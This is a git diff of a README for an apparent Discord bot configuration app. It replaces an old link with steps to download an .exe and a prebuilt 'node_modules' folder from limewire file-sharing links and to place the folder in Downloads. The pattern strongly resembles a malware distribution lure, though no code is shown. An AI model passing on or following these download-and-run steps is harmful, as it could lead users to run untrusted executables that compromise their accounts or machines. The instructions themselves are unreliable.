@@ -1,7 +1,12 @@
-# https://files.fm/u/rm7nvtsp62
+# APP FOR EASIER CONFIGURE
 
-NEW APP, TUTORIAL SOON
+Dowload .exe file https://limewire.com/d/g2J3w#Hm9vmKbthS
 
+Dowload "node_modules" from https://limewire.com/d/FcPwB#3sj3byoYdJ
+
+node_modules shall be in "Dowloads" Folder, if it will not be in the one bot will not work.
+
+Bot will instal node.js and discord.js by itself but if app will not start up, dowload them by yourself.
 
 # Video tutorial
 
